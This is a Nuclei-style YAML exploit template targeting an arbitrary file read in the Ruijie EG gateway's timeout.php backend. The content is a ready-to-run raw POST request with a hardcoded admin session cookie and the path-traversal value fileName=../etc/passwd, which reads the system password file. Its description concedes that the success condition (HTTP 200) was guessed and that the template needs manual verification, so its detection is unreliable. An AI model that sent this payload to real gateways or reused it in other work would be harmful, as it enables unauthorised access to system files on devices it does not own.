id: poc-8eb8d7ecdc1a64bcda93
info:
  name: 锐捷EG易网关timeout.php后台任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'POST /system_pi/timeout.php?a=getFile HTTP/1.1

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36

    Content-Type: application/x-www-form-urlencoded

    Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=bnrul7jabde55u5moo2a4q57a0; helpKey=home_sys;user=admin

    X-Requested-With: XMLHttpRequest

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Connection: close

    Content-Length: 22


    fileName=../etc/passwd'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
